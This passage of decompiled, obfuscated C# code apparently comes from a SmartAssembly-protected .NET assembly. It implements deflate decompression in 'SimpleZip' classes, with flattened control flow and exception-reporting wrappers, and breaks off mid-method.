                  num1 = 33;
                  continue;
                case 13:
                  num1 = num13 >= 0 ? 17 : 15;
                  continue;
                case 14:
                  this.Ⴅ = (SimpleZip.ႤႳ) null;
                  this.Ⴗ = (SimpleZip.ႤႳ) null;
                  num3 = 2;
                  this.Ⴓ.Ⴃ = num3;
                  num1 = 32;
                  continue;
                case 15:
                  goto label_33;
                case 16:
                  goto label_12;
                case 17:
                  this.Ⴀ.Ⴅ(this.Ⴓ.Ⴗ);
                  SimpleZip.ႤႰ ⴄⴐ2 = this;
                  num14 = ⴄⴐ2.Ⴓ.Ⴈ + num13;
                  ⴄⴐ2.Ⴓ.Ⴈ = num14;
                  num1 = 26;
                  continue;
                case 18:
                  num1 = num7 >= 0 ? 9 : 28;
                  continue;
                case 19:
                  num9 = 9;
                  this.Ⴓ.Ⴃ = num9;
                  num1 = 1;
                  continue;
                case 20:
                  num4 = SimpleZip.ႤႰ.Ⴐ[Ⴓ - 257];
                  this.Ⴓ.Ⴓ = num4;
                  num1 = 24;
                  continue;
                case 21:
                  goto label_28;
                case 22:
                  goto label_16;
                case 24:
                case 29:
                  num5 = SimpleZip.ႤႰ.Ⴈ[Ⴓ - 257];
                  this.Ⴓ.Ⴗ = num5;
                  num1 = 0;
                  continue;
                case 26:
                  this.Ⴐ.Ⴃ(this.Ⴓ.Ⴓ, this.Ⴓ.Ⴈ);
                  num1 = 27;
                  continue;
                case 27:
                  num2 -= this.Ⴓ.Ⴓ;
                  num15 = 7;
                  this.Ⴓ.Ⴃ = num15;
                  num1 = 33;
                  continue;
                case 28:
                  goto label_24;
                case 30:
                  num1 = this.Ⴓ.Ⴗ <= 0 ? 26 : 31;
                  continue;
                case 31:
                  num12 = 10;
                  this.Ⴓ.Ⴃ = num12;
                  num13 = this.Ⴀ.Ⴍ(this.Ⴓ.Ⴗ);
                  num1 = 13;
                  continue;
                case 32:
                  goto label_18;
                case 33:
                  num1 = num2 >= 258 ? 12 : 3;
                  continue;
                case 34:
                  num6 = 8;
                  this.Ⴓ.Ⴃ = num6;
                  num7 = this.Ⴀ.Ⴍ(this.Ⴓ.Ⴗ);
                  num1 = 18;
                  continue;
                default:
                  num2 = this.Ⴐ.Ⴀ();
                  num1 = 33;
                  continue;
              }
            }
label_12:
            flag = true;
            goto label_40;
label_16:
            flag = false;
            goto label_40;
label_18:
            flag = true;
            goto label_40;
label_24:
            flag = false;
            goto label_40;
label_28:
            flag = false;
            goto label_40;
label_33:
            flag = false;
            goto label_40;
label_38:
            flag = true;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴓ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num7;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num13;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) ⴃ;
            StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this);
            throw;
          }
label_40:
          switch (1)
          {
            default:
              return flag;
          }
        }
        catch (Exception ex)
        {
          int num17;
          object[] objects = new object[20]
          {
            (object) num2,
            (object) Ⴓ,
            (object) num7,
            (object) num13,
            (object) ⴃ,
            (object) flag,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) num8,
            (object) num9,
            (object) num10,
            (object) num11,
            (object) num12,
            (object) num14,
            (object) num15,
            (object) num1,
            (object) num17,
            (object) this
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      private bool Ⴐ()
      {
        int num1;
        int num2;
        int num3;
        bool flag1;
        int num4;
        bool flag2;
        int num5;
        int num6;
        int num7;
        int num8;
        int num9;
        int num10;
        int num11;
        int num12;
        int num13;
        int num14;
        int num15;
        try
        {
          try
          {
            num1 = 24;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num15 = 7;
                  this.Ⴓ.Ⴃ = num15;
                  num1 = 1;
                  continue;
                case 1:
                  goto label_51;
                case 2:
                  num8 = num2 = this.Ⴀ.Ⴍ(16);
                  this.Ⴓ.Ⴄ = num8;
                  num1 = 26;
                  continue;
                case 3:
                  num12 = this.Ⴐ.Ⴓ(this.Ⴀ, this.Ⴓ.Ⴄ);
                  goto case 8;
                case 4:
                  this.Ⴗ = this.Ⴗ.Ⴓ();
                  this.Ⴅ = this.Ⴗ.Ⴍ();
                  num1 = 0;
                  continue;
                case 5:
                  this.Ⴀ.Ⴅ(3);
                  num1 = (num4 & 1) == 0 ? 25 : 35;
                  continue;
                case 6:
                  num1 = 15;
                  continue;
                case 7:
                  goto label_18;
                case 8:
                  num1 = 19;
                  continue;
                case 9:
                  this.Ⴀ.Ⴅ(16);
                  num9 = 4;
                  this.Ⴓ.Ⴃ = num9;
                  num1 = 12;
                  continue;
                case 10:
                  goto label_39;
                case 11:
                  goto label_52;
                case 12:
                  num10 = this.Ⴀ.Ⴍ(16);
                  num1 = num10 >= 0 ? 23 : 10;
                  continue;
                case 13:
                case 16:
                  num4 = this.Ⴀ.Ⴍ(3);
                  num1 = num4 >= 0 ? 5 : 36;
                  continue;
                case 14:
                case 27:
                  this.Ⴀ.Ⴍ();
                  num5 = 3;
                  this.Ⴓ.Ⴃ = num5;
                  num1 = 15;
                  continue;
                case 15:
                  goto label_33;
                case 17:
                  goto label_36;
                case 19:
                  SimpleZip.ႤႰ ⴄⴐ = this;
                  num13 = ⴄⴐ.Ⴓ.Ⴄ - num12;
                  ⴄⴐ.Ⴓ.Ⴄ = num13;
                  num1 = 33;
                  continue;
                case 20:
                  this.Ⴗ = new SimpleZip.ႤႣ();
                  num7 = 6;
                  this.Ⴓ.Ⴃ = num7;
                  num1 = 15;
                  continue;
                case 21:
                  num1 = !this.Ⴓ.Ⴅ ? 13 : 7;
                  continue;
                case 22:
                  goto label_53;
                case 23:
                  this.Ⴀ.Ⴅ(16);
                  num11 = 5;
                  this.Ⴓ.Ⴃ = num11;
                  num1 = 3;
                  continue;
                case 25:
                  num2 = num4 >> 1;
                  int num16;
                  switch (num2)
                  {
                    case 0:
                      num16 = 14;
                      break;
                    case 1:
                      num16 = 28;
                      break;
                    case 2:
                      num16 = 20;
                      break;
                    default:
                      num16 = 6;
                      break;
                  }
                  num1 = num16;
                  continue;
                case 26:
                  num1 = num2 >= 0 ? 9 : 17;
                  continue;
                case 28:
                  this.Ⴗ = SimpleZip.ႤႳ.Ⴅ;
                  this.Ⴅ = SimpleZip.ႤႳ.Ⴐ;
                  num6 = 7;
                  this.Ⴓ.Ⴃ = num6;
                  num1 = 15;
                  continue;
                case 29:
                  goto label_46;
                case 30:
                  goto label_48;
                case 31:
                  num1 = 22;
                  continue;
                case 32:
                  num1 = this.Ⴗ.Ⴐ(this.Ⴀ) ? 4 : 30;
                  continue;
                case 33:
                  num1 = this.Ⴓ.Ⴄ != 0 ? 29 : 34;
                  continue;
                case 34:
                  goto label_45;
                case 35:
                  flag2 = true;
                  this.Ⴓ.Ⴅ = flag2;
                  num1 = 25;
                  continue;
                case 36:
                  goto label_20;
                default:
                  num2 = this.Ⴓ.Ⴃ;
                  int num17;
                  switch (num2)
                  {
                    case 2:
                      num17 = 21;
                      break;
                    case 3:
                      num17 = 2;
                      break;
                    case 4:
                      num17 = 12;
                      break;
                    case 5:
                      num17 = 3;
                      break;
                    case 6:
                      num17 = 32;
                      break;
                    case 7:
                      num17 = 1;
                      break;
                    case 8:
                      num17 = 1;
                      break;
                    case 9:
                      num17 = 1;
                      break;
                    case 10:
                      num17 = 1;
                      break;
                    case 11:
                      num17 = 22;
                      break;
                    case 12:
                      num17 = 11;
                      break;
                    default:
                      num17 = 31;
                      break;
                  }
                  num1 = num17;
                  continue;
              }
            }
label_18:
            num3 = 12;
            this.Ⴓ.Ⴃ = num3;
            flag1 = false;
            goto label_55;
label_20:
            flag1 = false;
            goto label_55;
label_33:
            flag1 = true;
            goto label_55;
label_36:
            flag1 = false;
            goto label_55;
label_39:
            flag1 = false;
            goto label_55;
label_45:
            num14 = 2;
            this.Ⴓ.Ⴃ = num14;
            flag1 = true;
            goto label_55;
label_46:
            flag1 = !this.Ⴀ.Ⴄ();
            goto label_55;
label_48:
            flag1 = false;
            goto label_55;
label_51:
            flag1 = this.Ⴗ();
            goto label_55;
label_52:
            flag1 = false;
            goto label_55;
label_53:
            flag1 = false;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num10;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num12;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num2;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
            throw;
          }
label_55:
          switch (1)
          {
            default:
              return flag1;
          }
        }
        catch (Exception ex)
        {
          int num18;
          object[] objects = new object[19]
          {
            (object) num4,
            (object) num10,
            (object) num12,
            (object) num2,
            (object) flag1,
            (object) num3,
            (object) flag2,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) num8,
            (object) num9,
            (object) num11,
            (object) num13,
            (object) num14,
            (object) num15,
            (object) num1,
            (object) num18,
            (object) this
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public int Ⴍ(byte[] Ⴀ, int Ⴓ, int Ⴗ)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        try
        {
          try
          {
            num1 = 5;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  num1 = this.Ⴓ.Ⴃ == 11 ? 10 : 11;
                  continue;
                case 2:
                case 9:
                  num1 = this.Ⴓ.Ⴃ != 11 ? 1 : 4;
                  continue;
                case 3:
                case 8:
                  goto label_12;
                case 4:
                  goto label_10;
                case 6:
                  num1 = this.Ⴐ.Ⴃ() <= 0 ? 4 : 2;
                  continue;
                case 7:
                  num2 += num3;
                  Ⴗ -= num3;
                  num1 = Ⴗ != 0 ? 10 : 12;
                  continue;
                case 10:
                  num1 = this.Ⴐ() ? 1 : 6;
                  continue;
                case 11:
                  num3 = this.Ⴐ.Ⴅ(Ⴀ, Ⴓ, Ⴗ);
                  Ⴓ += num3;
                  num1 = 7;
                  continue;
                case 12:
                  goto label_6;
                default:
                  num2 = 0;
                  num1 = 1;
                  continue;
              }
            }
label_6:
            num4 = num2;
            goto label_12;
label_10:
            num4 = num2;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num3;
            byte[] o4 = Ⴀ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴓ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5, (object) o6);
            throw;
          }
label_12:
          switch (2)
          {
            default:
              return num4;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          int num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num5;
          byte[] o7 = Ⴀ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) Ⴓ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o9 = (ValueType) Ⴗ;
          StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8, (object) o9);
          throw;
        }
      }

      static ႤႰ()
      {
        int num1;
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
          try
          {
            num1 = 0;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  num1 = 3;
                  continue;
                case 2:
                case 3:
                  goto label_5;
                case 4:
                  goto label_6;
                default:
                  int[] numArray1 = new int[29];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray1, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x6000015\u002D1), 367, 334);
                  SimpleZip.ႤႰ.Ⴐ = numArray1;
                  int[] numArray2 = new int[29];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray2, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x6000015\u002D2), 459, 490);
                  SimpleZip.ႤႰ.Ⴈ = numArray2;
                  goto case 1;
              }
            }
label_5:
            int[] numArray3 = new int[30];
            // ISSUE: field reference
            UsageReportSender.Ⴀ((Array) numArray3, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x6000015\u002D3), 257, 288);
            SimpleZip.ႤႰ.Ⴅ = numArray3;
label_6:
            SimpleZip.ႤႰ.Ⴍ = new int[30]
            {
              0,
              0,
              0,
              0,
              1,
              1,
              2,
              2,
              3,
              3,
              4,
              4,
              5,
              5,
              6,
              6,
              7,
              7,
              8,
              8,
              9,
              9,
              10,
              10,
              11,
              11,
              12,
              12,
              13,
              13
            };
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException0(ex);
            throw;
          }
          switch (3)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    internal sealed class ႤႤ
    {
      private ႷႨ.Ⴓ Ⴐ;

      public int Ⴍ(int Ⴗ)
      {
        int num1;
        int num2;
        int ⴓ;
        int num3;
        int num4;
        uint num5;
        int num6;
        try
        {
          try
          {
            num1 = 9;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  SimpleZip.ႤႤ ⴄⴄ1 = this;
                  num6 = ⴄⴄ1.Ⴐ.Ⴐ + 16;
                  ⴄⴄ1.Ⴐ.Ⴐ = num6;
                  num1 = 4;
                  continue;
                case 1:
                  SimpleZip.ႤႤ ⴄⴄ2 = this;
                  int ⴃ = (int) ⴄⴄ2.Ⴐ.Ⴃ;
                  byte[] ⴗ1 = this.Ⴐ.Ⴗ;
                  SimpleZip.ႤႤ ⴄⴄ3 = this;
                  num3 = (ⴓ = ⴄⴄ3.Ⴐ.Ⴓ) + 1;
                  ⴄⴄ3.Ⴐ.Ⴓ = num3;
                  int index1 = ⴓ;
                  int num7 = (int) ⴗ1[index1] & (int) byte.MaxValue;
                  byte[] ⴗ2 = this.Ⴐ.Ⴗ;
                  SimpleZip.ႤႤ ⴄⴄ4 = this;
                  num4 = (ⴓ = ⴄⴄ4.Ⴐ.Ⴓ) + 1;
                  ⴄⴄ4.Ⴐ.Ⴓ = num4;
                  int index2 = ⴓ;
                  int num8 = ((int) ⴗ2[index2] & (int) byte.MaxValue) << 8;
                  int num9 = (num7 | num8) << this.Ⴐ.Ⴐ;
                  num5 = (uint) (ⴃ | num9);
                  ⴄⴄ2.Ⴐ.Ⴃ = num5;
                  num1 = 0;
                  continue;
                case 2:
                case 4:
                  goto label_7;
                case 3:
                case 5:
                case 7:
                  goto label_4;
                case 6:
                  num1 = this.Ⴐ.Ⴓ != this.Ⴐ.Ⴍ ? 1 : 7;
                  continue;
                default:
                  num1 = this.Ⴐ.Ⴐ >= Ⴗ ? 4 : 6;
                  continue;
              }
            }
label_4:
            num2 = -1;
            goto label_9;
label_7:
            num2 = (int) ((long) this.Ⴐ.Ⴃ & (long) ((1 << Ⴗ) - 1));
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴓ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
label_9:
          switch (0)
          {
            default:
              return num2;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) ⴓ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<uint> o5 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num1;
          int num10;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) num10;
          // ISSUE: variable of a boxed type
          __Boxed<int> o10 = (ValueType) Ⴗ;
          StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) this, (object) o10);
          throw;
        }
      }

      public void Ⴅ(int Ⴄ)
      {
        int num1;
        uint num2;
        int num3;
        try
        {
          try
          {
            num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 2:
                case 5:
                  goto label_3;
                default:
                  SimpleZip.ႤႤ ⴄⴄ1 = this;
                  num2 = ⴄⴄ1.Ⴐ.Ⴃ >> Ⴄ;
                  ⴄⴄ1.Ⴐ.Ⴃ = num2;
                  num1 = 2;
                  continue;
              }
            }
label_3:
            SimpleZip.ႤႤ ⴄⴄ2 = this;
            num3 = ⴄⴄ2.Ⴐ.Ⴐ - Ⴄ;
            ⴄⴄ2.Ⴐ.Ⴐ = num3;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴄ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
          switch (3)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<uint> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) Ⴄ;
          StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this, (object) o6);
          throw;
        }
      }

      [SpecialName]
      public int Ⴐ()
      {
        try
        {
          int ⴐ;
          try
          {
            ⴐ = this.Ⴐ.Ⴐ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return ⴐ;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      [SpecialName]
      public int Ⴈ()
      {
        try
        {
          int num;
          try
          {
            num = this.Ⴐ.Ⴍ - this.Ⴐ.Ⴓ + (this.Ⴐ.Ⴐ >> 3);
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return num;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void Ⴍ()
      {
        int num1;
        uint num2;
        int num3;
        try
        {
          try
          {
            num1 = 3;
            while (true)
            {
              switch (num1)
              {
                case 1:
                case 2:
                case 4:
                  goto label_3;
                default:
                  SimpleZip.ႤႤ ⴄⴄ1 = this;
                  num2 = ⴄⴄ1.Ⴐ.Ⴃ >> (this.Ⴐ.Ⴐ & 7);
                  ⴄⴄ1.Ⴐ.Ⴃ = num2;
                  num1 = 1;
                  continue;
              }
            }
label_3:
            SimpleZip.ႤႤ ⴄⴄ2 = this;
            num3 = ⴄⴄ2.Ⴐ.Ⴐ & -8;
            ⴄⴄ2.Ⴐ.Ⴐ = num3;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          switch (4)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<uint> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool Ⴄ()
      {
        try
        {
          bool flag;
          try
          {
            flag = this.Ⴐ.Ⴓ == this.Ⴐ.Ⴍ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public int Ⴅ(byte[] Ⴍ, int Ⴈ, int Ⴗ)
      {
        int num1;
        int num2;
        uint num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int ⴓ;
        int num8;
        uint num9;
        int num10;
        try
        {
          try
          {
            num1 = 18;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  --Ⴗ;
                  ++num2;
                  num1 = 14;
                  continue;
                case 1:
                  AppPathFinder.Ⴍ((Array) this.Ⴐ.Ⴗ, this.Ⴐ.Ⴓ, (Array) Ⴍ, Ⴈ, Ⴗ, 719, 725);
                  num1 = 5;
                  continue;
                case 2:
                case 3:
                  Ⴗ = num6;
                  num1 = 1;
                  continue;
                case 4:
                  SimpleZip.ႤႤ ⴄⴄ1 = this;
                  num3 = ⴄⴄ1.Ⴐ.Ⴃ >> 8;
                  ⴄⴄ1.Ⴐ.Ⴃ = num3;
                  num1 = 7;
                  continue;
                case 5:
                  SimpleZip.ႤႤ ⴄⴄ2 = this;
                  num7 = ⴄⴄ2.Ⴐ.Ⴓ + Ⴗ;
                  ⴄⴄ2.Ⴐ.Ⴓ = num7;
                  num1 = 21;
                  continue;
                case 6:
                  num1 = Ⴗ <= num6 ? 1 : 3;
                  continue;
                case 7:
                  SimpleZip.ႤႤ ⴄⴄ3 = this;
                  num4 = ⴄⴄ3.Ⴐ.Ⴐ - 8;
                  ⴄⴄ3.Ⴐ.Ⴐ = num4;
                  num1 = 0;
                  continue;
                case 8:
                  Ⴍ[Ⴈ++] = (byte) this.Ⴐ.Ⴃ;
                  num1 = 4;
                  continue;
                case 9:
                  num6 = this.Ⴐ.Ⴍ - this.Ⴐ.Ⴓ;
                  num1 = 6;
                  continue;
                case 10:
                  byte[] ⴗ = this.Ⴐ.Ⴗ;
                  SimpleZip.ႤႤ ⴄⴄ4 = this;
                  num8 = (ⴓ = ⴄⴄ4.Ⴐ.Ⴓ) + 1;
                  ⴄⴄ4.Ⴐ.Ⴓ = num8;
                  int index = ⴓ;
                  num9 = (uint) ⴗ[index] & (uint) byte.MaxValue;
                  this.Ⴐ.Ⴃ = num9;
                  num1 = 16;
                  continue;
                case 11:
                case 19:
                  goto label_10;
                case 12:
                  goto label_19;
                case 13:
                  num1 = Ⴗ > 0 ? 8 : 15;
                  continue;
                case 14:
                  num1 = this.Ⴐ.Ⴐ <= 0 ? 15 : 13;
                  continue;
                case 15:
                  num1 = Ⴗ != 0 ? 9 : 11;
                  continue;
                case 16:
                  num10 = 8;
                  this.Ⴐ.Ⴐ = num10;
                  num1 = 12;
                  continue;
                case 21:
                  num1 = (this.Ⴐ.Ⴓ - this.Ⴐ.Ⴍ & 1) == 0 ? 12 : 10;
                  continue;
                default:
                  num2 = 0;
                  num1 = 14;
                  continue;
              }
            }
label_10:
            num5 = num2;
            goto label_21;
label_19:
            num5 = num2 + Ⴗ;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num6;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) ⴓ;
            byte[] o5 = Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴈ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o7 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6, (object) o7);
            throw;
          }
label_21:
          switch (1)
          {
            default:
              return num5;
          }
        }
        catch (Exception ex)
        {
          int num11;
          object[] objects = new object[16]
          {
            (object) num2,
            (object) num6,
            (object) ⴓ,
            (object) num5,
            (object) num3,
            (object) num4,
            (object) num7,
            (object) num8,
            (object) num9,
            (object) num10,
            (object) num1,
            (object) num11,
            (object) this,
            (object) Ⴍ,
            (object) Ⴈ,
            (object) Ⴗ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public ႤႤ()
      {
        this.Ⴐ.Ⴓ = 0;
        this.Ⴐ.Ⴍ = 0;
        this.Ⴐ.Ⴃ = 0U;
        this.Ⴐ.Ⴐ = 0;
        // ISSUE: explicit constructor call
        base.\u002Ector();
        try
        {
        }
        catch (Exception ex)
        {
          int num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          uint num3;
          // ISSUE: variable of a boxed type
          __Boxed<uint> o3 = (ValueType) num3;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      public void Ⴃ(byte[] Ⴃ, int Ⴍ, int Ⴅ)
      {
        int num1;
        int num2;
        uint num3;
        int num4;
        byte[] numArray;
        int num5;
        int num6;
        try
        {
          try
          {
            num1 = 13;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 9:
                  SimpleZip.ႤႤ ⴄⴄ1 = this;
                  num3 = ⴄⴄ1.Ⴐ.Ⴃ | (uint) (((int) Ⴃ[Ⴍ++] & (int) byte.MaxValue) << this.Ⴐ.Ⴐ);
                  ⴄⴄ1.Ⴐ.Ⴃ = num3;
                  num1 = 12;
                  continue;
                case 1:
                  num1 = Ⴍ > num2 ? 6 : 8;
                  continue;
                case 2:
                  goto label_13;
                case 3:
                  num1 = (Ⴅ & 1) == 0 ? 14 : 9;
                  continue;
                case 4:
                case 8:
                  num1 = num2 <= Ⴃ.Length ? 3 : 6;
                  continue;
                case 5:
                  goto label_3;
                case 6:
                  goto label_8;
                case 7:
                  num1 = 0 > Ⴍ ? 6 : 1;
                  continue;
                case 10:
                  num2 = Ⴍ + Ⴅ;
                  goto case 7;
                case 12:
                  SimpleZip.ႤႤ ⴄⴄ2 = this;
                  num4 = ⴄⴄ2.Ⴐ.Ⴐ + 8;
                  ⴄⴄ2.Ⴐ.Ⴐ = num4;
                  num1 = 14;
                  continue;
                case 14:
                  numArray = Ⴃ;
                  this.Ⴐ.Ⴗ = numArray;
                  num5 = Ⴍ;
                  this.Ⴐ.Ⴓ = num5;
                  num1 = 2;
                  continue;
                default:
                  num1 = this.Ⴐ.Ⴓ >= this.Ⴐ.Ⴍ ? 10 : 5;
                  continue;
              }
            }
label_3:
            throw new InvalidOperationException();
label_8:
            throw new ArgumentOutOfRangeException();
label_13:
            num6 = num2;
            this.Ⴐ.Ⴍ = num6;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            byte[] o3 = Ⴃ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴅ;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
            throw;
          }
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          int num7;
          object[] objects = new object[12]
          {
            (object) num2,
            (object) num3,
            (object) num4,
            (object) numArray,
            (object) num5,
            (object) num6,
            (object) num1,
            (object) num7,
            (object) this,
            (object) Ⴃ,
            (object) Ⴍ,
            (object) Ⴅ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      static ႤႤ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static Assembly Ⴗ([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj1 ^ obj0)
          {
            case 71:
              num2 = 4;
              break;
            default:
              num2 = 3;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
                goto label_3;
              case 2:
              case 6:
                num1 = 1;
                continue;
              case 3:
                num1 = 1;
                continue;
              case 4:
              case 5:
              case 7:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႤ.Ⴗ);
                num1 = 1;
                continue;
            }
          }
label_8:
          return Assembly.GetCallingAssembly();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
